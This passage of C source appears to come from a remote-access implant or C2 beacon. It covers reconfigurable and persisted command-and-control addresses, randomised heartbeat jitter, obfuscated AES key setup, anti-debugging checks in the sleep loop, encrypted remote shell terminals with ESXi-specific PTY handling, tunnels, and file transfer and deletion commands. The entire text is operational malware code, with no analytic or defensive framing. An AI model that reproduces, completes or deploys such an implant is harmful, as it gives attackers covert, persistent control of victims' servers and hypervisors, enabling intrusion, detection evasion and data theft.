        return ((uint64_t)tv.tv_sec * 1000ULL) + ((uint64_t)tv.tv_usec / 1000ULL);
    }

    return ((uint64_t)time(NULL)) * 1000ULL;

#endif

}



static uint64_t get_wallclock_ms(void) {

    return get_platform_time_ms();

}



static void main_activity_touch(void) {

    pthread_mutex_lock(&g_main_state_mutex);

    g_main_last_activity_ms = get_wallclock_ms();
    if (g_beacon_sleep_enabled) {
        g_main_online_deadline_ms = g_main_last_activity_ms + (uint64_t)BEACON_ONLINE_WINDOW_MS;
    }

    pthread_mutex_unlock(&g_main_state_mutex);

}



static uint64_t main_activity_idle_ms(void) {

    uint64_t now_ms;

    uint64_t last_ms;

    uint64_t idle_ms;



    now_ms = get_wallclock_ms();

    pthread_mutex_lock(&g_main_state_mutex);

    last_ms = g_main_last_activity_ms;

    pthread_mutex_unlock(&g_main_state_mutex);



    if (last_ms == 0 || now_ms <= last_ms) {

        return 0;

    }

    idle_ms = now_ms - last_ms;

    return idle_ms;

}



static void main_inflight_enter(const char* reason) {

    int count;

    pthread_mutex_lock(&g_main_state_mutex);

    g_main_inflight_tasks++;

    count = g_main_inflight_tasks;

    pthread_mutex_unlock(&g_main_state_mutex);

    LOG_DEBUG("Main inflight enter (%s), count=%d", reason ? reason : "unknown", count);

}



static void main_inflight_leave(const char* reason) {

    int count;

    pthread_mutex_lock(&g_main_state_mutex);

    if (g_main_inflight_tasks > 0) {

        g_main_inflight_tasks--;

    }

    count = g_main_inflight_tasks;

    pthread_mutex_unlock(&g_main_state_mutex);

    LOG_DEBUG("Main inflight leave (%s), count=%d", reason ? reason : "unknown", count);

}



static int main_inflight_count(void) {

    int count;

    pthread_mutex_lock(&g_main_state_mutex);

    count = g_main_inflight_tasks;

    pthread_mutex_unlock(&g_main_state_mutex);

    return count;

}



static void beacon_hold_enter(const char* reason) {

    pthread_mutex_lock(&g_realtime_hold_mutex);

    g_realtime_hold_count++;

    LOG_INFO("Beacon realtime enter (%s), hold_count=%d", reason ? reason : "unknown", g_realtime_hold_count);

    pthread_mutex_unlock(&g_realtime_hold_mutex);

}



static void beacon_hold_leave(const char* reason) {

    pthread_mutex_lock(&g_realtime_hold_mutex);

    if (g_realtime_hold_count > 0) {

        g_realtime_hold_count--;

    }

    LOG_INFO("Beacon realtime leave (%s), hold_count=%d", reason ? reason : "unknown", g_realtime_hold_count);

    pthread_mutex_unlock(&g_realtime_hold_mutex);

}



static int beacon_is_realtime(void) {

    int hold_count;

    pthread_mutex_lock(&g_realtime_hold_mutex);

    hold_count = g_realtime_hold_count;

    pthread_mutex_unlock(&g_realtime_hold_mutex);

    return hold_count > 0;

}



#ifndef _WIN32

static int wait_chunk_ms(int milliseconds) {

    struct timeval tv;
    struct timespec req;
    struct timespec rem;
    int rc;

    if (milliseconds <= 0) {
        return 0;
    }

    errno = 0;
    rc = poll(NULL, 0, milliseconds);
    if (rc == 0 || errno == EINTR) {
        return 0;
    }

    memset(&tv, 0, sizeof(tv));
    tv.tv_sec = milliseconds / 1000;
    tv.tv_usec = (milliseconds % 1000) * 1000;
    errno = 0;
    rc = select(0, NULL, NULL, NULL, &tv);
    if (rc == 0 || errno == EINTR) {
        return 0;
    }

    memset(&req, 0, sizeof(req));
    req.tv_sec = milliseconds / 1000;
    req.tv_nsec = (long)(milliseconds % 1000) * 1000000L;
    errno = 0;
    while (nanosleep(&req, &rem) != 0) {
        if (errno != EINTR) {
            break;
        }
        req = rem;
        errno = 0;
    }

    if (errno == 0 || errno == EINTR) {
        return 0;
    }

    return usleep((useconds_t)milliseconds * 1000U);

}

#endif





static void sleep_ms(int milliseconds) {

#ifdef _WIN32

    Sleep(milliseconds);

#else

    uint64_t deadline_ms;

    if (milliseconds <= 0) {
        return;
    }

    deadline_ms = get_platform_time_ms() + (uint64_t)milliseconds;
    while (!g_shutdown) {
        uint64_t now_ms = get_platform_time_ms();
        uint64_t remaining_ms;
        int chunk;

        if (now_ms >= deadline_ms) {
            break;
        }

        remaining_ms = deadline_ms - now_ms;
        chunk = (remaining_ms > 200ULL) ? 200 : (int)remaining_ms;
        if (chunk <= 0) {
            chunk = 1;
        }

        anti_debug_check_runtime(now_ms);
        (void)wait_chunk_ms(chunk);
    }

#endif

}

static uint64_t main_connection_age_ms(void) {
    uint64_t now_ms;
    uint64_t connected_ms;

    now_ms = get_wallclock_ms();

    pthread_mutex_lock(&g_main_state_mutex);
    connected_ms = g_main_connected_at_ms;
    pthread_mutex_unlock(&g_main_state_mutex);

    if (connected_ms == 0 || now_ms <= connected_ms) {
        return 0;
    }

    return now_ms - connected_ms;
}

static int main_online_deadline_expired(void) {
    LOG_INFO("[main] main_online_deadline_expired() called");
    uint64_t now_ms;
    uint64_t deadline_ms;

    now_ms = get_wallclock_ms();

    pthread_mutex_lock(&g_main_state_mutex);
    deadline_ms = g_main_online_deadline_ms;
    pthread_mutex_unlock(&g_main_state_mutex);
    LOG_INFO("[main] main_online_deadline_expired(): now_ms = %llu", now_ms);
    LOG_INFO("[main] main_online_deadline_expired(): deadline_ms = %llu", deadline_ms);
    LOG_INFO("[main] main_online_deadline_expired(): g_main_last_activity_ms = %llu", g_main_last_activity_ms);
    return deadline_ms != 0 && now_ms >= deadline_ms;
}

static void main_request_control_close(struct mg_connection* conn, const char* reason) {
    int fd;
    int should_shutdown;

    (void) reason;

    g_main_conn_intentional_close = 1;
    if (conn != NULL) {
        conn->is_closing = 1;
    }

    pthread_mutex_lock(&g_main_state_mutex);
    fd = g_main_conn_fd;
    should_shutdown = (conn != NULL && g_main_active_conn == conn && fd >= 0);
    pthread_mutex_unlock(&g_main_state_mutex);

    if (should_shutdown) {
#ifdef _WIN32
        shutdown((SOCKET) fd, SD_BOTH);
#else
        shutdown(fd, SHUT_RDWR);
#endif
    }
}





static thread_context_t* find_thread(int thread_id) {

    thread_context_t* ctx = NULL;

    HASH_FIND_INT(g_threads, &thread_id, ctx);

    return ctx;

}





static void add_thread(thread_context_t* ctx) {

    HASH_ADD_INT(g_threads, thread_id, ctx);

}





static MAYBE_UNUSED void remove_thread(thread_context_t* ctx) {

    HASH_DEL(g_threads, ctx);

}





static MAYBE_UNUSED int get_thread_count(void) {

    return HASH_COUNT(g_threads);

}





static void cleanup_exited_threads(void) {

    thread_context_t *ctx, *tmp;

    HASH_ITER(hh, g_threads, ctx, tmp) {

        if (ctx->exited) {

            printf("Cleaning up exited thread %d\n", ctx->thread_id);

            JOIN_THREAD(ctx->thread);

            CLOSE_THREAD(ctx->thread);

            HASH_DEL(g_threads, ctx);

            free(ctx);

        }

    }

}









static void safe_strncpy(char* dst, const char* src, size_t size);

static void secure_zero(void* ptr, size_t len);





static void get_current_c2_address(char* host, size_t host_size, int* port);

static int update_c2_address(const char* new_host, int new_port);

static int update_c2_address_list(const char* const* addresses, int count);





static void generate_session_key(unsigned char* key, size_t key_len);





static int terminal_start(uint32_t term_id, const char* program, uint16_t width, uint16_t height);

static int terminal_stop(uint32_t term_id);

static void terminal_cleanup_all(void);

static void* terminal_thread_func(void* arg);

static const char* terminal_configure_utf8_locale(void);





static int send_terminal_pack_on_socket(struct mg_connection* c, uint32_t term_id, unsigned char* session_key, unsigned char* iv);









void print_session_key(const char* label, const unsigned char* key, size_t key_len);

static void debug_hex_dump(const char* label, const uint8_t* data, size_t len);





static int send_terminal_command_ack(struct mg_connection *c, uint32_t command_code, uint32_t task_id);

static void handle_terminal_stop(struct mg_connection *c, uint32_t task_id, uint32_t term_id);

static int parse_tunnel_start_command(mpack_node_t data_node, tunnel_start_command_t* cmd);

static int parse_tunnel_control_command(mpack_node_t data_node, tunnel_control_command_t* cmd);

static void handle_tunnel_start_command(const tunnel_start_command_t* cmd);

static void handle_tunnel_stop_command(const tunnel_control_command_t* cmd);

static void handle_tunnel_pause_command(const tunnel_control_command_t* cmd);

static void handle_tunnel_resume_command(const tunnel_control_command_t* cmd);

static int send_tunnel_control_ack(struct mg_connection* c, uint32_t command_code, uint32_t task_id);

static int send_command_response(struct mg_connection* c, uint32_t command_code,

    uint32_t task_id,

    const uint8_t* data, size_t data_len);

static int connect_c2_relay_fd(void);



void handle_file_download_command(struct mg_connection *c, const file_download_command_t* cmd);

int parse_file_download_command(mpack_node_t data_node, file_download_command_t* cmd);

void handle_file_upload_command(struct mg_connection *c, const file_upload_command_t* cmd);

int parse_file_remove_command(mpack_node_t data_node, file_remove_command_t* cmd);

static int handle_file_unzip(const char* zip_path, const char* final_path, char* err_msg, size_t err_len);

void handle_file_remove_ack(struct mg_connection *c, uint32_t task_id);

void handle_file_upload_ack(struct mg_connection *c, uint32_t task_id);

void upload_entries_cleanup(void);

void on_connection_success(struct mg_connection* c);



// --- Global variables ---

uint8_t GLOBAL_KEY[32];

// Initialize Key (AES-256 requires 32-byte key)

void init_key() {
    char key_hex_buf[65];
    const char* key_hex = NULL;

    obf_get_default_key_hex(key_hex_buf, sizeof(key_hex_buf));
    key_hex = KEY_HEX[0] != '\0' ? KEY_HEX : key_hex_buf;

    for (int i = 0; i < 32; i++) {

        sscanf(key_hex + 2 * i, "%02hhx", &GLOBAL_KEY[i]);

    }

    obf_secure_zero(key_hex_buf, sizeof(key_hex_buf));
    srand(time(NULL));

}



static pthread_mutex_t g_socket_mutex = PTHREAD_MUTEX_INITIALIZER;



// ==================== Agent ID ====================

static unsigned int g_agent_id = 0;

static pthread_mutex_t g_agent_id_mutex = PTHREAD_MUTEX_INITIALIZER;



static unsigned int generate_agent_id(void) {

    LOG_INFO("generate_agent_id............................\n\n\n");

    unsigned int id = 0;

    int fd;



    fd = open("/dev/urandom", O_RDONLY);

    if (fd >= 0) {

        if (read(fd, &id, sizeof(id)) == sizeof(id)) {

            close(fd);

            return id;

        }

        close(fd);

    }



    srand((unsigned int)time(NULL) ^ (unsigned int)getpid());

    return ((unsigned int)rand() << 16) | ((unsigned int)rand() & 0xFFFF);

}



static void init_agent_id(void) {

    pthread_mutex_lock(&g_agent_id_mutex);

    if (g_agent_id == 0) {

        g_agent_id = generate_agent_id();

        LOG_INFO("Generated Agent ID: %u (0x%08x)", g_agent_id, g_agent_id);

    }

    pthread_mutex_unlock(&g_agent_id_mutex);

}



static unsigned int get_agent_id(void) {

    unsigned int id;

    pthread_mutex_lock(&g_agent_id_mutex);

    id = g_agent_id;

    pthread_mutex_unlock(&g_agent_id_mutex);

    return id;

}





typedef struct {

    char hostname[256];

    char resolved_ip[INET6_ADDRSTRLEN];

    int port;

    int ai_family;

    time_t last_resolve_time;

    pthread_mutex_t mutex;

} DNSCache;



static DNSCache g_dns_cache = {

    .mutex = PTHREAD_MUTEX_INITIALIZER

};





typedef struct {

    int ipv6_supported;

    int legacy_system;

    char default_bind_addr[64];

    char kernel_version[128];

    int detected;

} SystemCapabilities;



static SystemCapabilities g_sys_caps = { 0 };

static pthread_mutex_t g_sys_caps_mutex = PTHREAD_MUTEX_INITIALIZER;





typedef struct {

    char c2_host[256];

    int c2_port;

    time_t updated_at;

    pthread_mutex_t mutex;

} DynamicConfig;



static DynamicConfig g_config = {

    .mutex = PTHREAD_MUTEX_INITIALIZER

};



typedef struct {

    char host[256];

    int port;

    int valid;

    pthread_mutex_t mutex;

} ActiveC2Address;



static ActiveC2Address g_active_c2 = {

    .mutex = PTHREAD_MUTEX_INITIALIZER

};





typedef struct {

    int base_interval;

    int jitter_percent;

    int jitter_mode;

    int min_interval;

    int max_interval;

    pthread_mutex_t mutex;

} HeartbeatConfig;



static HeartbeatConfig g_hb_config = {

    .mutex = PTHREAD_MUTEX_INITIALIZER

};





static pthread_mutex_t g_random_mutex = PTHREAD_MUTEX_INITIALIZER;

static int g_random_initialized = 0;



static MAYBE_UNUSED void init_random(void) {

    pthread_mutex_lock(&g_random_mutex);



    if (!g_random_initialized) {

        unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)getpid();



        int fd = open("/dev/urandom", O_RDONLY);

        if (fd >= 0) {

            read(fd, &seed, sizeof(seed));

            close(fd);

        }



        srand(seed);

        g_random_initialized = 1;

    }



    pthread_mutex_unlock(&g_random_mutex);

}



static int random_range(int min, int max) {

    int r;



    if (min >= max) return min;



    pthread_mutex_lock(&g_random_mutex);

    r = min + (rand() % (max - min + 1));

    pthread_mutex_unlock(&g_random_mutex);



    return r;

}



static MAYBE_UNUSED double random_double(void) {

    double r;



    pthread_mutex_lock(&g_random_mutex);

    r = (double)rand() / (double)RAND_MAX;

    pthread_mutex_unlock(&g_random_mutex);



    return r;

}



static double random_normal(double mean, double stddev) {

    static int has_spare = 0;

    static double spare;

    double u, v, s;



    pthread_mutex_lock(&g_random_mutex);



    if (has_spare) {

        has_spare = 0;

        pthread_mutex_unlock(&g_random_mutex);

        return mean + stddev * spare;

    }



    do {

        u = (rand() / ((double)RAND_MAX)) * 2.0 - 1.0;

        v = (rand() / ((double)RAND_MAX)) * 2.0 - 1.0;

        s = u * u + v * v;

    } while (s >= 1.0 || s == 0.0);



    s = sqrt(-2.0 * log(s) / s);

    spare = v * s;

    has_spare = 1;



    pthread_mutex_unlock(&g_random_mutex);



    return mean + stddev * u * s;

}



static MAYBE_UNUSED int calculate_next_heartbeat_interval(void) {

    int base_interval;

    int jitter_percent;

    int jitter_mode;

    int min_interval;

    int max_interval;

    int next_interval;



    pthread_mutex_lock(&g_hb_config.mutex);



    base_interval = g_hb_config.base_interval;

    jitter_percent = g_hb_config.jitter_percent;

    jitter_mode = g_hb_config.jitter_mode;

    min_interval = g_hb_config.min_interval;

    max_interval = g_hb_config.max_interval;



    pthread_mutex_unlock(&g_hb_config.mutex);



    int jitter_range = (base_interval * jitter_percent) / 100;



    switch (jitter_mode) {

    case JITTER_MODE_FIXED:

        next_interval = base_interval;

        break;



    case JITTER_MODE_RANDOM: {

        int min_val = base_interval - jitter_range;

        int max_val = base_interval + jitter_range;



        if (min_val < min_interval) min_val = min_interval;

        if (max_val > max_interval) max_val = max_interval;



        next_interval = random_range(min_val, max_val);

        break;

    }



    case JITTER_MODE_NORMAL: {

        double stddev = jitter_range / 3.0;

        double interval_double = random_normal((double)base_interval, stddev);



        next_interval = (int)interval_double;



        if (next_interval < min_interval) next_interval = min_interval;

        if (next_interval > max_interval) next_interval = max_interval;

        break;

    }



    default:

        next_interval = base_interval;

        break;

    }



    return next_interval;

}









typedef struct TerminalNode {

    uint32_t term_id;

    int handshake_done;

    int handshake_sent;

    int banner_done;

    int running;

    int exited;

    int realtime_held;                  // Beacon realtime hold flag

    struct mg_connection* target_conn;

    int pty_master;

    int pty_slave;

    int pty_slot;

    int using_esxi_fallback;

    char pty_path[32];

    pid_t shell_pid;

    pthread_t thread;

    int should_exit;





    struct AES_ctx ctx_encrypt;

    struct AES_ctx ctx_decrypt;

    unsigned char term_key[32];  // AES-256 key (32 bytes)

    unsigned char term_iv[16];
    uint64_t stream_enc_offset;
    uint64_t stream_dec_offset;



    uint16_t rows;

    uint16_t cols;

    char program[256];

    time_t created_at;

    struct TerminalNode* next;

} TerminalNode;





static TerminalNode* g_terminal_list = NULL;

static pthread_mutex_t g_terminal_list_mutex = PTHREAD_MUTEX_INITIALIZER;

#define ESXI_PTY_SLOT_COUNT 4

static const char* g_esxi_pty_paths[ESXI_PTY_SLOT_COUNT] = {
    "/dev/ttyp0",
    "/dev/ttyp1",
    "/dev/ttyp2",
    "/dev/ttyp3"
};

static uint32_t g_esxi_pty_slots[ESXI_PTY_SLOT_COUNT] = { 0 };

static pthread_mutex_t g_esxi_pty_slots_mutex = PTHREAD_MUTEX_INITIALIZER;

static void terminal_close_pty_fds(TerminalNode* term) {

    if (term == NULL) return;

    if (term->pty_master >= 0) {

        close(term->pty_master);

        term->pty_master = -1;

    }

    if (term->pty_slave >= 0) {

        close(term->pty_slave);

        term->pty_slave = -1;

    }

}

static void terminal_release_esxi_slot(TerminalNode* term) {

    int slot;

    if (term == NULL) return;

    slot = term->pty_slot;

    if (slot < 0 || slot >= ESXI_PTY_SLOT_COUNT) {

        term->pty_slot = -1;

        term->using_esxi_fallback = 0;

        term->pty_path[0] = '\0';

        return;

    }

    pthread_mutex_lock(&g_esxi_pty_slots_mutex);

    if (g_esxi_pty_slots[slot] == term->term_id) {

        g_esxi_pty_slots[slot] = 0;

        LOG_INFO("Released ESXi PTY slot %d (%s) for term_id=0x%08x",
            slot, g_esxi_pty_paths[slot], term->term_id);

    }

    else if (g_esxi_pty_slots[slot] != 0) {

        LOG_WARN("ESXi PTY slot ownership mismatch: slot=%d owner=0x%08x term_id=0x%08x",
            slot, g_esxi_pty_slots[slot], term->term_id);

    }

    pthread_mutex_unlock(&g_esxi_pty_slots_mutex);

    term->pty_slot = -1;

    term->using_esxi_fallback = 0;

    term->pty_path[0] = '\0';

}

static void terminal_cleanup_pty(TerminalNode* term) {

    terminal_close_pty_fds(term);

    terminal_release_esxi_slot(term);

}

static void terminal_wait_shell_exit(TerminalNode* term, int timeout_ms) {

    int elapsed = 0;

    int status = 0;

    if (term == NULL || term->shell_pid <= 0) return;

    while (elapsed <= timeout_ms) {

        pid_t wait_rc = waitpid(term->shell_pid, &status, WNOHANG);

        if (wait_rc == term->shell_pid) {

            term->shell_pid = 0;

            return;

        }

        if (wait_rc < 0 && errno == ECHILD) {

            term->shell_pid = 0;

            return;

        }

        if (wait_rc < 0) {

            LOG_WARN("waitpid() failed while cleaning shell: term_id=0x%08x, pid=%d, errno=%d (%s)",
                term->term_id, term->shell_pid, errno, strerror(errno));

            return;

        }

        if (timeout_ms == 0) {

            return;

        }

        usleep(50000);

        elapsed += 50;

    }

}

static void terminal_shutdown_shell(TerminalNode* term, int force_kill) {

    if (term == NULL || term->shell_pid <= 0) return;

    terminal_wait_shell_exit(term, 0);

    if (term->shell_pid <= 0) return;

    LOG_INFO("Stopping shell for term_id=0x%08x, pid=%d",
        term->term_id, term->shell_pid);

    kill(term->shell_pid, SIGTERM);

    terminal_wait_shell_exit(term, 500);

    if (force_kill && term->shell_pid > 0) {

        LOG_WARN("Shell did not exit after SIGTERM, sending SIGKILL: term_id=0x%08x, pid=%d",
            term->term_id, term->shell_pid);

        kill(term->shell_pid, SIGKILL);

        terminal_wait_shell_exit(term, 500);

    }

}

static void terminal_drain_fd(int fd) {

    char drain_buf[128];

    if (fd < 0) return;

    while (read(fd, drain_buf, sizeof(drain_buf)) > 0) {
        ;
    }

}

static int terminal_try_reserve_esxi_slot(int slot, uint32_t term_id) {

    int reserved = 0;

    pthread_mutex_lock(&g_esxi_pty_slots_mutex);

    if (slot >= 0 && slot < ESXI_PTY_SLOT_COUNT && g_esxi_pty_slots[slot] == 0) {

        g_esxi_pty_slots[slot] = term_id;

        reserved = 1;

    }

    pthread_mutex_unlock(&g_esxi_pty_slots_mutex);

    return reserved;

}

static void terminal_release_esxi_slot_by_id(int slot, uint32_t term_id) {

    if (slot < 0 || slot >= ESXI_PTY_SLOT_COUNT) return;

    pthread_mutex_lock(&g_esxi_pty_slots_mutex);

    if (g_esxi_pty_slots[slot] == term_id) {

        g_esxi_pty_slots[slot] = 0;

    }

    pthread_mutex_unlock(&g_esxi_pty_slots_mutex);

}

static int terminal_wait_readable(int fd, int timeout_ms) {

    struct pollfd pfd;

    if (fd < 0) return -1;

    memset(&pfd, 0, sizeof(pfd));

    pfd.fd = fd;

    pfd.events = POLLIN;

    return poll(&pfd, 1, timeout_ms);

}

static void terminal_realtime_enter(TerminalNode* term) {

    if (term == NULL) return;

    if (__sync_bool_compare_and_swap(&term->realtime_held, 0, 1)) {

        beacon_hold_enter("shell");

    }

}



static void terminal_realtime_leave(TerminalNode* term) {

    if (term == NULL) return;

    if (__sync_bool_compare_and_swap(&term->realtime_held, 1, 0)) {

        beacon_hold_leave("shell");

    }

}



/**



 */

static void terminal_add(TerminalNode* node) {

    pthread_mutex_lock(&g_terminal_list_mutex);



    node->next = g_terminal_list;

    g_terminal_list = node;



    pthread_mutex_unlock(&g_terminal_list_mutex);



    LOG_INFO("Terminal 0x%08x added to list", node->term_id);

}



/**



 */

static TerminalNode* terminal_find(uint32_t term_id) {

    TerminalNode* current = NULL;



    pthread_mutex_lock(&g_terminal_list_mutex);



    current = g_terminal_list;

    while (current) {

        if (current->term_id == term_id) {

            break;

        }

        current = current->next;

    }



    pthread_mutex_unlock(&g_terminal_list_mutex);



    return current;

}



/**



 */

static MAYBE_UNUSED void terminal_remove(uint32_t term_id) {

    TerminalNode* current;

    TerminalNode* prev = NULL;



    pthread_mutex_lock(&g_terminal_list_mutex);



    current = g_terminal_list;

    while (current) {

        if (current->term_id == term_id) {

            if (prev) {

                prev->next = current->next;

            }

            else {

                g_terminal_list = current->next;

            }



            LOG_INFO("Terminal 0x%08x removed from list", term_id);

            terminal_realtime_leave(current);

            free(current);

            break;

        }

        prev = current;

        current = current->next;

    }



    pthread_mutex_unlock(&g_terminal_list_mutex);

}



/**



 */

static MAYBE_UNUSED void terminal_cleanup_all(void) {

    TerminalNode* current;

    TerminalNode* next;



    LOG_INFO("Cleaning up all terminals...");



    pthread_mutex_lock(&g_terminal_list_mutex);



    current = g_terminal_list;

    while (current) {

        next = current->next;





        current->should_exit = 1;





        if (current->shell_pid > 0) {

            LOG_INFO("Killing shell pid=%d for term_id=0x%08x",

                current->shell_pid, current->term_id);

            kill(current->shell_pid, SIGKILL);

        }



        terminal_realtime_leave(current);



        LOG_INFO("Setting is_closing = 1");



        if (current->target_conn) current->target_conn->is_closing = 1;

        

        terminal_cleanup_pty(current);



        current = next;

    }



    pthread_mutex_unlock(&g_terminal_list_mutex);



    LOG_INFO("All terminals cleaned up");

}



/**



 */

static int terminal_count(void) {

    int count = 0;

    TerminalNode* current;



    pthread_mutex_lock(&g_terminal_list_mutex);



    current = g_terminal_list;

    while (current) {

        count++;

        current = current->next;

    }



    pthread_mutex_unlock(&g_terminal_list_mutex);



    return count;

}









const char* command_code_to_string(uint32_t code) {

    switch (code) {

    case CMD_CODE_SHELL: return "Shell";

        //case CMD_CODE_FILE: return "File";



    default: return "Unknown";

    }

}





const char* message_type_to_string(int type) {

    switch (type) {

    case MSG_TYPE_INIT: return "INIT";

    case MSG_TYPE_TASK: return "TASK";

    case MSG_TYPE_HEARTBEAT: return "HEARTBEAT";

    default: return "Unknown";

    }

}





static void safe_strncpy(char* dst, const char* src, size_t size) {

    if (!dst || !src || size == 0) return;

    if (dst == src) return;

    size_t src_len = strlen(src);

    size_t copy_len = src_len < (size - 1) ? src_len : (size - 1);

    if (copy_len > 0) {

        memcpy(dst, src, copy_len);

    }

    dst[copy_len] = '\0';

}



static volatile sig_atomic_t g_signal_received = 0;



static MAYBE_UNUSED void signal_handler(int sig) {

    g_signal_received = sig;

    if (sig == SIGINT || sig == SIGTERM) {

        LOG_INFO("Received signal %d, initiating shutdown", sig);

        atomic_store_compat(&g_state.should_exit, 1);

        atomic_store_compat(&g_state.connected, 0);





        int sock = atomic_load_compat(&g_state.socket_fd);

        if (sock >= 0) {

            shutdown(sock, SHUT_RDWR);

        }

    }

    else if (sig == SIGHUP) {

        LOG_INFO("Received SIGHUP, will reconnect");

        atomic_store_compat(&g_state.connected, 0);

    }

}



static MAYBE_UNUSED void safe_close_socket(int* sock_fd) {

    int fd;



    if (!sock_fd || *sock_fd < 0) return;



    pthread_mutex_lock(&g_socket_mutex);



    fd = *sock_fd;

    if (fd >= 0) {

        shutdown(fd, SHUT_RDWR);

        close(fd);

        LOG_DEBUG("Socket %d closed", fd);

        *sock_fd = -1;

    }



    pthread_mutex_unlock(&g_socket_mutex);

}



static MAYBE_UNUSED void secure_zero(void* ptr, size_t len) {

    volatile unsigned char* p;

    if (!ptr || len == 0) return;

    p = (volatile unsigned char*)ptr;

    while (len--) *p++ = 0;

}





static int detect_ipv6_support(void) {

    int sock;

    struct sockaddr_in6 test_addr;



    sock = socket(AF_INET6, SOCK_STREAM, 0);

    if (sock < 0) {

        return 0;

    }



    memset(&test_addr, 0, sizeof(test_addr));

    test_addr.sin6_family = AF_INET6;

    test_addr.sin6_addr = in6addr_loopback;

    test_addr.sin6_port = 0;



    if (bind(sock, (struct sockaddr*)&test_addr, sizeof(test_addr)) < 0) {

        close(sock);

        return 0;

    }



    close(sock);

    return 1;

}



static int detect_legacy_system(void) {

    struct utsname uts;

    int major, minor, patch;



    if (uname(&uts) < 0) {

        return 0;

    }



    if (sscanf(uts.release, "%d.%d.%d", &major, &minor, &patch) < 2) {

        return 0;

    }



    if (major < 2) return 1;



    if (major == 2) {

        if (minor < 6) return 1;

        if (minor == 6 && patch < 32) return 1;

    }



    return 0;

}



static void init_system_capabilities(void) {

    struct utsname uts;



    pthread_mutex_lock(&g_sys_caps_mutex);



    if (g_sys_caps.detected) {

        pthread_mutex_unlock(&g_sys_caps_mutex);

        return;

    }



    if (uname(&uts) == 0) {

        snprintf(g_sys_caps.kernel_version, sizeof(g_sys_caps.kernel_version),

            "%.63s %.63s", uts.sysname, uts.release);

    }

    else {

        strcpy(g_sys_caps.kernel_version, "Unknown");

    }



    g_sys_caps.ipv6_supported = detect_ipv6_support();

    g_sys_caps.legacy_system = detect_legacy_system();



#ifdef BIND_ADDR

    safe_strncpy(g_sys_caps.default_bind_addr, BIND_ADDR,

        sizeof(g_sys_caps.default_bind_addr));

#else

    if (g_sys_caps.ipv6_supported && !g_sys_caps.legacy_system) {

        strcpy(g_sys_caps.default_bind_addr, "::");

    }

    else {

        strcpy(g_sys_caps.default_bind_addr, "0.0.0.0");

    }

#endif



    g_sys_caps.detected = 1;



    pthread_mutex_unlock(&g_sys_caps_mutex);



    LOG_INFO("=== System Capabilities ===");

    LOG_INFO("Kernel: %s", g_sys_caps.kernel_version);

    LOG_INFO("IPv6 Support: %s", g_sys_caps.ipv6_supported ? "Yes" : "No");

    LOG_INFO("Legacy System: %s", g_sys_caps.legacy_system ? "Yes" : "No");

    LOG_INFO("Default Bind Address: %s", g_sys_caps.default_bind_addr);

    LOG_INFO("===========================");

}



static MAYBE_UNUSED const char* get_default_bind_addr(void) {

    if (!g_sys_caps.detected) {

        init_system_capabilities();

    }

    return g_sys_caps.default_bind_addr;

}



void init_config() {

    char host[256] = {0};

    int port = 0;



    if (parse_address_host_port(CLIENT_ADDR_1, host, sizeof(host), &port) == 0) {

        snprintf(g_config.c2_host, sizeof(g_config.c2_host), "%s", host);

        g_config.c2_port = port;

    } else {

        snprintf(g_config.c2_host, sizeof(g_config.c2_host), "%s", CLIENT_ADDR_1);

        g_config.c2_port = 80;

    }



    printf("[config] Parsed successfully: Host=%s, Port=%d\n", g_config.c2_host, g_config.c2_port);

}





static void init_dynamic_config(void) {

    char host[256] = {0};
    int port = 0;

    if (parse_address_host_port(get_current_client_addr(), host, sizeof(host), &port) != 0) {

        pthread_mutex_lock(&g_config.mutex);
        safe_strncpy(host, g_config.c2_host, sizeof(host));
        port = g_config.c2_port > 0 ? g_config.c2_port : 80;
        pthread_mutex_unlock(&g_config.mutex);

    }

    pthread_mutex_lock(&g_config.mutex);

    safe_strncpy(g_config.c2_host, host, sizeof(g_config.c2_host));

    g_config.c2_port = port;

    g_config.updated_at = time(NULL);



    pthread_mutex_unlock(&g_config.mutex);



    LOG_INFO("Dynamic config initialized: %s:%d", g_config.c2_host, g_config.c2_port);

}



static void set_active_c2_address(const char* host, int port) {

    if (host == NULL || host[0] == '\0' || port < 1 || port > 65535) {

        return;

    }



    pthread_mutex_lock(&g_active_c2.mutex);

    snprintf(g_active_c2.host, sizeof(g_active_c2.host), "%s", host);

    g_active_c2.port = port;

    g_active_c2.valid = 1;

    pthread_mutex_unlock(&g_active_c2.mutex);

}



static int get_active_c2_address(char* host, size_t host_size, int* port) {

    int valid = 0;



    if (host == NULL || port == NULL || host_size == 0) {

        return -1;

    }



    pthread_mutex_lock(&g_active_c2.mutex);

    valid = g_active_c2.valid;

    if (valid) {

        snprintf(host, host_size, "%s", g_active_c2.host);

        *port = g_active_c2.port;

    }

    pthread_mutex_unlock(&g_active_c2.mutex);



    return valid ? 0 : -1;

}



static void get_current_c2_address(char* host, size_t host_size, int* port) {

    const char* current_addr;

    if (host == NULL || port == NULL || host_size == 0) {

        return;

    }



    if (get_active_c2_address(host, host_size, port) == 0) {

        return;

    }



    current_addr = get_current_client_addr();

    if (current_addr != NULL &&

        parse_address_host_port(current_addr, host, host_size, port) == 0) {

        return;

    }



    pthread_mutex_lock(&g_config.mutex);

    snprintf(host, host_size, "%s", g_config.c2_host);

    *port = g_config.c2_port;

    pthread_mutex_unlock(&g_config.mutex);

}



static MAYBE_UNUSED int update_c2_address(const char* new_host, int new_port) {

    char normalized[RUNTIME_C2_ADDR_LEN];
    const char* addresses[1];

    if (!new_host || new_port <= 0 || new_port > 65535) {

        LOG_ERROR("Invalid C2 address: %s:%d", new_host ? new_host : "NULL", new_port);

        return -1;

    }

    if (build_connect_url(new_host, new_port, normalized, sizeof(normalized)) != 0) {

        return -1;

    }

    addresses[0] = normalized;
    return update_c2_address_list(addresses, 1);

}

static int update_c2_address_list(const char* const* addresses, int count) {
    anti_debug_check_sensitive();

    char normalized[RUNTIME_C2_MAX_ADDRS][RUNTIME_C2_ADDR_LEN];
    const char* normalized_ptrs[RUNTIME_C2_MAX_ADDRS];
    char old_log[3][RUNTIME_C2_ADDR_LEN];
    char new_log[3][RUNTIME_C2_ADDR_LEN];

    if (addresses == NULL || count <= 0 || count > g_addr_count) {

        return -1;

    }

    for (int i = 0; i < count; i++) {

        if (addresses[i] == NULL || normalize_callback_address_string(addresses[i], normalized[i], sizeof(normalized[i])) != 0) {

            LOG_ERROR("Invalid callback address: %s", addresses[i] ? addresses[i] : "<null>");
            return -1;

        }
        normalized_ptrs[i] = normalized[i];

    }

    if (persist_runtime_c2_addresses(normalized_ptrs, count) != 0) {

        LOG_ERROR("Failed to persist callback addresses");
        return -1;

    }

